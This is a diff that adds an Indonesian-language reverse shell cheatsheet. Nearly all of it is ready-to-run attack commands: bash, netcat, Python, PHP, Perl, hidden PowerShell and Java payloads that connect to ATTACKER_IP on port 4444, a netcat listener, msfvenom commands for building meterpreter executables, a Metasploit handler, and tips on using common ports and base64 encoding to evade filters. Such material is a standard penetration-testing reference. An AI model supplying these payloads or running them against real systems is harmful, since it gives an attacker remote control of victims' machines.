@@ -1,0 +1,97 @@
+Sip, berikut **Reverse Shell Cheatsheet** dalam format plain text untuk file txt-mu.
+
+---
+
+# REVERSE SHELL CHEATSHEET
+
+1. Konsep Dasar
+
+---
+
+* Reverse shell: target (victim) menghubungi attacker (listener).
+* Attacker menyiapkan listener.
+* Victim menjalankan payload reverse shell.
+
+2. Listener di Attacker
+
+---
+
+nc -lvnp 4444
+
+3. Payload Reverse Shell Populer
+
+---
+
+Bash:
+bash -i >& /dev/tcp/ATTACKER\_IP/4444 0>&1
+
+Netcat:
+nc -e /bin/bash ATTACKER\_IP 4444
+
+Netcat tanpa -e:
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER\_IP 4444 > /tmp/f
+
+Python:
+python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER\_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(\["/bin/sh","-i"]);'
+
+PHP:
+
+<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
+
+Perl:
+perl -e 'use Socket;\$i="ATTACKER\_IP";\$p=4444;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in(\$p,inet\_aton(\$i)))){open(STDIN,">\&S");open(STDOUT,">\&S");open(STDERR,">\&S");exec("/bin/sh -i");};'
+
+PowerShell (Windows):
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER\_IP",4444);\$s=\$client.GetStream();\[byte\[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=iex \$d 2>&1|Out-String;\$sb=\$r+"PS ";\$sb=\$sb+" ";\$sbt=(\[text.encoding]::ASCII).GetBytes(\$sb);\$s.Write(\$sbt,0,\$sbt.Length);}
+
+Java:
+r = Runtime.getRuntime().exec("/bin/bash -c bash -i >& /dev/tcp/ATTACKER\_IP/4444 0>&1")
+
+4. Web Reverse Shell
+
+---
+
+* Upload file webshell (php/asp/jsp).
+* Contoh: php-reverse-shell.php dari pentestmonkey.
+
+5. Stabilkan Shell
+
+---
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z
+stty raw -echo; fg
+reset
+
+6. Reverse Shell dengan Msfvenom
+
+---
+
+Windows EXE:
+msfvenom -p windows/meterpreter/reverse\_tcp LHOST=<ip> LPORT=4444 -f exe > shell.exe
+
+Linux ELF:
+msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf
+
+PHP Payload:
+msfvenom -p php/meterpreter/reverse\_tcp LHOST=<ip> LPORT=4444 -f raw > shell.php
+
+Listener di Metasploit:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse\_tcp
+set LHOST <ip>
+set LPORT <port>
+exploit
+
+7. Tips Penting
+
+---
+
+* Jalankan listener dulu sebelum payload.
+* Jika port diblok, coba port umum (80, 443, 53).
+* Gunakan encoding (misalnya base64) untuk bypass filter.
+* Pentestmonkey reverse shell cheatsheet bisa dijadikan referensi tambahan.
+
+---
